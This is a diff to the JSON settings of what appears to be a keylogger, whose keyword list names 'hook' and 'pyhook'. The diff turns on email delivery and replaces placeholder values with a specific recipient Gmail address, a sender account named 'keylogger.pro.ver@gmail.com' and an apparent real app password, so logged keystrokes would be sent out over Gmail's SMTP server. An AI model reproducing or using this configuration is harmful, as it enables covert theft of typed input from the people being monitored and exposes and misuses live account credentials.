@@ -8,14 +8,10 @@
         "hook",
         "pyhook"
     ],
-    "email_enabled": false,
-    "recipient_email": "your_email@example.com",
+    "email_enabled": true,
+    "recipient_email": "referal310u@gmail.com",
     "smtp_server": "smtp.gmail.com",
     "smtp_port": 587,
-    "smtp_user": "your_gmail@gmail.com",
-    "smtp_password": "your_app_password"
+    "smtp_user": "keylogger.pro.ver@gmail.com",
+    "smtp_password": "xdyy zgkk lawh exuj"
 }
-
-
-
-
